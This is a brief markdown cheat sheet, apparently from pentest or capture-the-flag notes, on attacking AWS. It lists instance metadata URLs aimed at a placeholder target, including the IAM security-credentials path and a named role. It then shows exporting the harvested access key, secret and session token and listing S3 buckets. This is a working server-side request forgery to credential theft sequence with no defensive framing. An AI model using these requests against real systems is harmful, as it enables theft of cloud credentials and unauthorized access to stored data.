# AWS Enspoints
```
http://TARGET/latest/meta-data
http://TARGET/latest/meta-data/iam/security-credentials/
http://TARGET/latest/meta-data/iam/security-credentials/ISRM-WAF-ROLE
```

Connecting to aws s3:
```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls
```